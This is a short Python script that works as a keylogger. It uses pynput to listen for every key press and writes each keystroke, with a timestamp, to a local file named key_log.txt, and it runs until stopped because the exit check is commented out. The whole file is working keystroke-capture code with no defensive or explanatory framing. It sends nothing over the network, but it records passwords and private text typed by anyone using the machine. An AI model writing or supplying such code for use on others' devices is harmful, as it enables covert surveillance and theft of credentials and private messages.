from pynput.keyboard import Key, Listener

import logging

# log file which stores strokes
log_dir="" 

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,format='%(asctime)s: %(message)s')

def in_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        # return false

#this says, listener is on
with Listener(on_press=in_press) as listener:
    listener.join()